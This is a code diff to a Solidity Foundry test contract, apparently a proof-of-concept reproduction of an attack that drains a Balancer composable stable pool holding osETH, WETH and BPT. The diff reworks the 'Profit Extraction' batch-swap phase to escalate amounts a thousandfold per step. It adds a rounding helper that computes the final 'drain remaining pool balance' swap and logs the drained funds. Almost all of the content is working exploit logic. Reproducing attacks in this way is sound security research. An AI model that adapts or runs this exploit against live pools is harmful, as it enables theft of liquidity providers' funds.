@@ -314,41 +314,27 @@ contract BalancerExploit is Test {
         }
 
         // ========== PHASE 3: Profit Extraction (ร—1000 progression) ==========
-        uint256[4] memory phase3Amounts = [
-            uint256(10_000),
-            10_000_000_000,
-            10_000_000_000_000_000,
-            10_000_000_000_000_000_000_000
-        ];
+        uint256 phase3Amounts = 10000;
 
-        for (uint256 i = 0; i < 4; i++) {
-            // osETH -> BPT
+        for (uint256 i = 0; i < 7; i++) {
             batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                 poolId: poolId,
-                assetInIndex: 0,
-                assetOutIndex: 1,
-                amount: phase3Amounts[i],
+                assetInIndex: i % 2 == 0 ? 0 : 2, // osETH or WETH
+                assetOutIndex: 1, // BPT
+                amount: phase3Amounts,
                 userData: ""
             });
-
-            // WETH -> BPT (1000x osETH amount)
-            if (i != 3) {
-                batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
-                    poolId: poolId,
-                    assetInIndex: 2,
-                    assetOutIndex: 1,
-                    amount: phase3Amounts[i] * 1000,
-                    userData: ""
-                });
-            }
+            phase3Amounts *= 1000;
         }
+
+        uint256 finalSwapAmount = calculator.divUp(1838483978630598473879, 2);
 
         // Cleanup: drain remaining pool balance
         batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
             poolId: poolId,
             assetInIndex: 2,
             assetOutIndex: 1,
-            amount: 941319322493191942754,
+            amount: finalSwapAmount,
             userData: ""
         });
 
@@ -356,7 +342,7 @@ contract BalancerExploit is Test {
             poolId: poolId,
             assetInIndex: 0,
             assetOutIndex: 1,
-            amount: 941319322493191942754,
+            amount: finalSwapAmount,
             userData: ""
         });
 
@@ -378,6 +364,9 @@ contract BalancerExploit is Test {
             limits,
             block.timestamp + 300
         );
+
+        uint256 drainFundAmount = composableStablePool.balanceOf(address(this));
+        console.log("Drained Fund Amount (BPT):", drainFundAmount);
     }
 }
 
@@ -453,6 +442,14 @@ contract Calculator is Test {
         uint256 scalingFactor
     ) internal pure returns (uint256) {
         return (amount * scalingFactor) / ONE;
+    }
+
+    function divUp(uint256 a, uint256 b) public pure returns (uint256) {
+        require(b != 0, "Division by zero");
+        if (a == 0) {
+            return 0;
+        }
+        return 1 + ((a - 1) / b);
     }
 
     function _divUp(uint256 a, uint256 b) internal pure returns (uint256) {
